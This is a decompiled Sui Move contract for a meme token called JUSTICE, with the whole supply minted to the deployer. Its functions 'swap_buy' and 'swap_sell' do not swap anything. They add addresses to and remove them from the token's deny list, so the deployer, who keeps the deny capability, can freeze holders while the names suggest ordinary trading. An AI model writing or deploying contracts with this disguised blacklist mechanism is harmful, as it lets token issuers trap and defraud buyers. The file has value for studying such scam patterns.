module 0xb901a057f831b16855f04e692e29411770c91d2b03694f2ddb3ccb4b0bde6a56::justice {
    struct JUSTICE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: JUSTICE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<JUSTICE>(arg0, 9, b"JUSTICE", b"Justice for Pnut and Fred", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmcC1kt6FcCJnfzpGyhNprFjFaNkLoJUEuBAZqMwQY4ZYu"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<JUSTICE>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<JUSTICE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<JUSTICE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<JUSTICE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JUSTICE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<JUSTICE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JUSTICE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<JUSTICE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

